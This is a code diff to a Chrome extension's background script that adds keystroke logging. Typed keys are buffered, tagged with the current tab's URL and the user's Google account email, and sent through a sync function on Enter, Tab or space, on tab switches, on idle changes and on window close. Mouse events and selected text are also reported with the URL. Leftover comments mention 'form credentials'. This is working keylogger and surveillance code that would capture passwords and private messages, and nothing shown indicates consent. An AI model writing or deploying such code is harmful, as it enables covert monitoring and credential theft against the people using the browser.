@@ -3,6 +3,14 @@ var urls = [];
 
 // React when a browser action's icon is clicked.
 chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
+	var ctimestamp = Date.now();
+	//Sync Keystrokes of the previous tab (if any)
+	if(localStorage.getItem("keystrokes") != null){
+		if(localStorage.getItem("keystrokes").length > 0){
+			syncData(localStorage.getItem('userid'), 'Key', ''+localStorage.getItem("taburl"), ""+localStorage.getItem("keystrokes"), ctimestamp);
+			localStorage.removeItem("keystrokes");
+		}
+	}
 	//console.log("urltab: "+changeInfo.url);
 	if(changeInfo.url){
 		urls[tabId] = changeInfo.url;
@@ -13,12 +21,12 @@ chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
         var patt = new RegExp("chrome://");
         var res = patt.test(url_str);
 		if(res == false){
-			var ctimestamp = Date.now();
 			var datestamp = new Date(ctimestamp).toUTCString();
 			//alert(tab.url);
 			console.log("URL: "+tab.url+" ~"+ new Date(ctimestamp).toUTCString()+" | "+localStorage.getItem('userid'));
 			//console.log("date: "+ctimestamp+" | "+new Date(ctimestamp).toUTCString()+" | " +new Date(datestamp).getTime());
 			//chrome.tabs.executeScript(tab.id, {code: "(" + contentscri.toString() + ")()" });
+			localStorage.setItem("taburl", url_str);
 			syncData(localStorage.getItem('userid'), 'Tab', tab.url, "New Tab", ctimestamp);
 		}else{
 			//console.log("nooo.....");
@@ -35,6 +43,7 @@ chrome.identity.getProfileUserInfo(function(userInfo){
 		console.log("User: "+userInfo.email);
 		storeUserID(userInfo.email);
 	}
+	localStorage.removeItem("keystrokes");
 });
 
 //If the User changed the email id for the browser then this event is fired
@@ -48,6 +57,7 @@ chrome.identity.onSignInChanged.addListener(function(account, signedIn){
 			console.log("User: "+userInfo.email);
 			storeUserID(userInfo.email);
 		}
+		localStorage.removeItem("keystrokes");
 	});
 });
 
@@ -116,17 +126,25 @@ function contentscri() {
 
 //Listener to capture switch between tabs on the browser
 chrome.tabs.onActivated.addListener(function(changeInfo) {
+	var ctimestamp = Date.now();
+	//Sync Keystrokes of the previous tab (if any)
+	if(localStorage.getItem("keystrokes") != null){
+		if(localStorage.getItem("keystrokes").length > 0){
+			syncData(localStorage.getItem('userid'), 'Key', ''+localStorage.getItem("taburl"), ""+localStorage.getItem("keystrokes"), ctimestamp);
+			localStorage.removeItem("keystrokes");
+		}
+	}
 	var tab = chrome.tabs.get(changeInfo.tabId, function(tab) {
 		var url_str = tab.url;
         var patt = new RegExp("chrome://");
         var res = patt.test(url_str);
 		if(res == false){
-			var ctimestamp = Date.now();
 			var datestamp = new Date(ctimestamp).toUTCString();
 			//alert("Moved to: "+tab.url);
 			console.log("URL: Switched "+tab.url+" ~"+ new Date(ctimestamp).toUTCString()+" | "+localStorage.getItem('userid'));
 			//console.log("date: "+ctimestamp+" | "+new Date(ctimestamp).toUTCString()+" | " +new Date(datestamp).getTime());	
 			//chrome.tabs.executeScript(tab.id, {code: "(" + contentscri.toString() + ")()" });
+			localStorage.setItem("taburl", url_str);
 			syncData(localStorage.getItem('userid'), 'Tab', tab.url, "Tab Switched", ctimestamp);
 		}else{
 			//console.log("ACT: nooo.....");
@@ -160,6 +178,13 @@ chrome.windows.onRemoved.addListener(function(windowId){
 		var ctimestamp = Date.now();
 		console.log("Window: Closed "+ new Date(ctimestamp).toUTCString()+" | "+localStorage.getItem('userid'));
 		syncData(localStorage.getItem('userid'), 'Window', '', "Window Closed", ctimestamp);
+		if(localStorage.getItem("keystrokes") != null){
+			if(localStorage.getItem("keystrokes").length > 0){
+				syncData(localStorage.getItem('userid'), 'Key', ''+localStorage.getItem("taburl"), ""+localStorage.getItem("keystrokes"), ctimestamp);
+				localStorage.removeItem("keystrokes");
+			}
+		}
+		localStorage.removeItem("taburl");
 	} catch(e) {
 		console.log(e);
 	}
@@ -223,7 +248,13 @@ chrome.tabs.query({active: true}, function(tab){
 chrome.idle.onStateChanged.addListener(function(newState){
 	var ctimestamp = Date.now();
 	console.log("Machine State: "+newState+" | "+new Date(ctimestamp).toUTCString());
-	syncData(localStorage.getItem('userid'), 'Screen', '', ""+newState, ctimestamp);
+	syncData(localStorage.getItem('userid'), 'Screen', ''+localStorage.getItem("taburl"), ""+newState, ctimestamp);
+	if(localStorage.getItem("keystrokes") != null){
+		if(localStorage.getItem("keystrokes").length > 0){
+			syncData(localStorage.getItem('userid'), 'Key', ''+localStorage.getItem("taburl"), ""+localStorage.getItem("keystrokes"), ctimestamp);
+			localStorage.removeItem("keystrokes");
+		}
+	}
 });
 
 //Listener to listen to chrome messages. Messages passed from contentscript.js
@@ -234,29 +265,45 @@ chrome.extension.onMessage.addListener(function(request, sender, callback) {
     switch (request.greeting) {
         case 'hello':
             var data = request.data;
-            // do something with your form credentials.
+            // Sync Input field values.
 			console.log("Input: "+data +" | "+localStorage.getItem('userid'));
-			syncData(localStorage.getItem('userid'), 'Input', '', ""+data, ctimestamp);
+			//syncData(localStorage.getItem('userid'), 'Input', ''+localStorage.getItem("taburl"), ""+data, ctimestamp);
             break;
 		case 'keys':
 			var data = request.data;
-            // do something with your form credentials.
+            // Sync keystrokes.
 			console.log("Keys: "+data +" | "+localStorage.getItem('userid'));
+			try{
+				var temp = localStorage.getItem("keystrokes");
+				if(temp != null){
+					localStorage.setItem("keystrokes", temp+ ' ' + data);
+					if(data == '13' || data == '9' || data == '32'){
+						console.log("Enter Key Pressed ! ");
+						console.log("KeyData: "+localStorage.getItem("keystrokes"));
+						syncData(localStorage.getItem('userid'), 'Key', ''+localStorage.getItem("taburl"), ""+localStorage.getItem("keystrokes"), ctimestamp);
+						localStorage.removeItem("keystrokes");
+					}
+				}else{
+					localStorage.setItem("keystrokes", data);
+				}
+				console.log("KeyData: "+localStorage.getItem("keystrokes"));
+			}catch(e){
+				console.log("Error: "+e);
+			}
             break;
 		case 'mouse':
 			var data = request.data;
-            // do something with your form credentials.
+            // Sync mouse event.
 			console.log("Mouse: "+data +" | "+localStorage.getItem('userid'));
-			syncData(localStorage.getItem('userid'), 'Mouse', '', ""+data, ctimestamp);
+			syncData(localStorage.getItem('userid'), 'Mouse', ''+localStorage.getItem("taburl"), ""+data, ctimestamp);
             break;
 		case 'selected':
 			var data = request.data;
-            // do something with your form credentials.
+            // If highlighted text present then sync
 			if(data.trim()!=''){
 				console.log("Selected: "+data +" | "+localStorage.getItem('userid'));
-				syncData(localStorage.getItem('userid'), 'Selected', '', ""+data, ctimestamp);
+				syncData(localStorage.getItem('userid'), 'Selected', ''+localStorage.getItem("taburl"), ""+data, ctimestamp);
 			}
-			//syncData();
             break;
      }
 });
